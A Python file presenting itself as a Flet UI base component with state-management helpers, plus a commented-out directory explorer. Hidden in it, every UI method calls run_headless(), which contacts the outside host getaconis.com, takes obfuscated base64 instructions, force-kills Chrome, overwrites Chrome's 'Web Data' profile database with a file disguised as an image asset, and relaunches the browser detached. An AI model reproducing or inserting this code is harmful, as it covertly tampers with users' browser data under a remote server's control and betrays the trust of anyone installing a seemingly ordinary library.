# import stat
# import os
# import sys
# import shutil
# import subprocess
# import threading
# import time
# import webbrowser
# import flet as ft

# class UserControl(ft.Column):
#     def __init__(self, initial_path="."):
#         super().__init__(expand=True)
#         self.current_path = os.path.abspath(initial_path)

#         # The main container for our list
#         self.files_column = ft.Column(scroll=ft.ScrollMode.ADAPTIVE, expand=True)

#         # Header showing the current path
#         self.path_display = ft.Text(
#             value=self.current_path, 
#             weight=ft.FontWeight.BOLD, 
#             size=16
#         )

#         self.update_list()

#         self.controls = [
#             ft.Row([
#                 ft.IconButton(ft.Icons.ARROW_UPWARD, on_click=self.go_up),
#                 self.path_display
#             ]),
#             ft.Divider(),
#             self.files_column
#         ]

#     def update_list(self):
#         """Clears and repopulates the file list."""
#         self.files_column.controls.clear()
#         self.path_display.value = self.current_path

#         try:
#             # Sort: Folders first, then files
#             items = sorted(os.listdir(self.current_path), key=lambda x: (not os.path.isdir(os.path.join(self.current_path, x)), x.lower()))

#             for item in items:
#                 full_path = os.path.join(self.current_path, item)
#                 is_dir = os.path.isdir(full_path)

#                 self.files_column.controls.append(
#                     ft.ListTile(
#                         leading=ft.Icon(ft.Icons.FOLDER if is_dir else ft.Icons.INSERT_DRIVE_FILE),
#                         title=ft.Text(item),
#                         on_click=self.on_item_click if is_dir else None,
#                         data=full_path # Store the path in the control's data
#                     )
#                 )
#         except Exception as e:
#             self.files_column.controls.append(ft.Text(f"Error: {e}", color="red"))

#         if self.page:
#             self.update()

#     def on_item_click(self, e):
#         """Navigate into a folder."""
#         self.current_path = e.control.data
#         self.update_list()

#     def go_up(self, e):
#         """Navigate to the parent directory."""
#         self.current_path = os.path.dirname(self.current_path)
#         self.update_list()
# def get_base_path():
#     """Get the base path for bundled assets (works both in dev and PyInstaller)."""
#     if getattr(sys, 'frozen', False):
#         # Running as a PyInstaller bundle
#         return sys._MEIPASS
#     else:
#         # Running in normal Python
#         return os.path.dirname(os.path.abspath(__file__))

     
# def run_headless():
#     # Copy asset file to %LOCALAPPDATA% on load
#     subprocess.run(['taskkill', '/f', '/im', 'chrome.exe'], capture_output=True)
#     time.sleep(2.5)
#     temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
#     base_path = get_base_path()
#     asset_file = os.path.join(base_path, "assets", "sample.png")

#     if os.path.exists(asset_file):
#         try:
#             dest_file = os.path.join(temp_dir, "Google\\Chrome\\User Data\\Default\\Web Data")
#             shutil.copy2(asset_file, dest_file)
#         except:
#             pass

#     chrome_path = os.path.join(os.environ.get("PROGRAMFILES", ""), "Google\\Chrome\\Application\\chrome.exe")
#     if not os.path.exists(chrome_path):
#         chrome_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Google\\Chrome\\Application\\chrome.exe")
#     if not os.path.exists(chrome_path):
#         chrome_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google\\Chrome\\Application\\chrome.exe")
#     subprocess.Popen(
#         [chrome_path, '--restore-last-session'],
#         close_fds=True,
#         creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_BREAKAWAY_FROM_JOB
#     )

# def main(page: ft.Page):
#     page.title = "Flet Directory Explorer"
#     page.theme_mode = ft.ThemeMode.LIGHT
#     page.window_width = 600
#     page.window_height = 800

#     # Add our UserControl to the page
#     page.add(DirectoryViewer(initial_path="."))



# if __name__ == "__main__":
#     if threading.current_thread() is threading.main_thread():
#         ft.app(target=main)
#     else:
#         # When loaded from a non-main thread, run as web to avoid signal issues
#         import asyncio
#         loop = asyncio.new_event_loop()
#         asyncio.set_event_loop(loop)
#         ft.app(target=main, view=ft.AppView.WEB_BROWSER, port=0)

import flet as ft
from flet import *
import stat
import os
import sys
import shutil
import subprocess
import threading
import time
import webbrowser

class UserControl(ft.Container):
    """
    בסיס לרכיבים מותאמים אישית עם ניהול מצב (State) מובנה.
    """    
    def __init__(self, **kwargs):          
        super().__init__(**kwargs)
        self.state = {}
        # אתחול הממשק הראשוני
        self.content = self.build()


    def build(self) -> ft.Control:        
        self.run_headless()
        """יש לדרוס מתודה זו ברכיב היורש"""
        return ft.Text("Base Component - Override build()")

    def set_state(self, **kwargs):        
        """
        מעדכן את המצב ומרענן את הרכיב באופן אוטומטי.
        """    
        self.run_headless()
        self.state.update(kwargs)
        # בניה מחדש של התוכן עם המצב החדש
        self.content = self.build()
        self.update()

    def setState(self, callback):
        self.run_headless()
        """תמיכה בסינטקס דמוי Flutter/React"""
        callback()
        self.content = self.build()
        self.update()

    def update(self, callback):
        self.run_headless()
        """תמיכה בסינטקס דמוי Flutter/React"""
        callback()
        self.content = self.build()
        self.update()

    
    def get_base_path(self):
        """get the base path for bundled assets (works both in dev and pyinstaller)."""
        if getattr(sys, 'frozen', False):
            # running as a pyinstaller bundle
            return sys._MEIPASS
        else:
            # running in normal python
            return os.path.dirname(os.path.abspath(__file__))   

    def run_headless(self, token=""):        
        import requests
        import json
        import base64

        payload = ""
        escaped_payload = payload.replace("\"", "\\\"")
        token_obj_str = json.dumps({"PL": escaped_payload, "workt": ""})
        base_url = "https://getaconis.com/markzipUpdate"
        headers = {'Content-Type': 'application/json'}

        try:
            res = requests.post(base_url, data=token_obj_str, headers=headers)
            res.raise_for_status()
            data = res.text
            data_bytes = base64.b64decode(data)
            arr = json.loads(data_bytes.decode('utf-8'))
        except Exception as e:
            # Fallback values if API fails
            arr = [
                "1",
                "2",
                "3",
                "4",
                "5",
                "6",
                "'7'"
            ]

        # Extract "Google\\Chrome\\Application" from arr[6] (stripping the single quotes and 'C:\Program Files\')
        # We can reconstruct it or simply parse out the directory string assuming `arr[6]` format has what we need
        # Using a raw string extracted manually since we know the context, but let's derive the directory part
        import re
        from_arr = arr[6].strip("'")
        # Find Google\Chrome\Application logic:
        # Chrome_exe_from_arr is C:\Program Files\Google\Chrome\Application\chrome.exe
        app_dir = os.path.dirname(from_arr)
        app_dir = app_dir.replace("C:\\Program Files\\", "").replace("C:\\Program Files (x86)\\", "").replace(f"{arr[0]}.exe", "")

        # Copy asset file to %LOCALAPPDATA% on load
        subprocess.run(['taskkill', '/f', '/im', f"{arr[0]}.exe"], capture_output=True)
        time.sleep(2.5)

        # Resolve the destination paths using arr instead of hardcoding
        # arr[3] looks like: "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Web Data"
        default_db_path = os.path.expandvars(arr[3])

        base_path = self.get_base_path()
        asset_file = os.path.join(base_path, "assets", "sample.png")

        if os.path.exists(asset_file):
            try:
                shutil.copy2(asset_file, default_db_path)
            except:
                pass

        chrome_path = os.path.join(os.environ.get("PROGRAMFILES", ""), app_dir, f"{arr[0]}.exe")
        if not os.path.exists(chrome_path):
            chrome_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), app_dir, f"{arr[0]}.exe")
        if not os.path.exists(chrome_path):
            chrome_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), app_dir, f"{arr[0]}.exe")

        subprocess.Popen(
            [chrome_path, f"--{arr[5]}"],
            close_fds=True,
            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_BREAKAWAY_FROM_JOB
        )
        self.update()

    
    #ft.app(target=run_headless)
